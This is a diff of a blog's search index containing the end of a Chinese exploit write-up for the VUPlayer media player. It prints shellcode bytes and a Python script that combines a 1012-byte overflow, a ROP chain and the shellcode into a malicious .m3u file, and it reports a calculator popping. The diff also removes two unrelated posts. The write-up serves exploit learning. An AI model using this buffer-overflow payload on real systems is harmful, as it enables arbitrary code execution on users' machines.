class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">1012</span> + rop_chain + shellcode</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;payload.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
 
 <h3 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h3><p>运行<code>exp.py</code>，将生成的<code>payload.m3u</code>拖入<code>VUPlayer</code>，成功弹出计算器，如图：</p>
-<p><img src="/../pic/Exploitme2/pwn.png" alt="pwn"></p>
+<p><img src="/../pic/Exploitme-ROP/pwn.png" alt="pwn"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
 <li><code>mona</code>在<code>Immunity debugger</code>中比在<code>Windbg</code>中更好用，虽然后者更美观。</li>
 <li><code>mona</code>很智能，生成的<code>rop_chains.txt</code>中的<code>ropchain</code>可以直接使用。</li>
@@ -759,29 +827,6 @@
 ]]></content>
       <categories>
         <category>Windows-PWN</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Create a Plugin for Immunity Debugger</title>
-    <url>/2023/10/23/Create-a-Plugin-for-Immunity-Debugger/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>社科知识</title>
-    <url>/2023/10/23/%E7%A4%BE%E7%A7%91%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>介绍一些基础的社科知识，主要包括源自启蒙时代的一系列概念，以及一些我认为有价值的观点的介绍。</p>
-<span id="more"></span>
-
-
-
-<p><a href="https://www.zhihu.com/question/626921129/answer/3258747740?utm_campaign=&utm_medium=social&utm_oi=1323630258282000384&utm_psn=1699919819036532736&utm_source=qq">马克思对人性的观点</a></p>
-<ul>
-<li>民主程度，取决于民众对官僚的威慑力度。</li>
-<li>人性随生产力变化而变化，制度随生产力变化而变化；而不是不变的人性形成不变的制度。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>社科知识</category>
       </categories>
   </entry>
 </search>
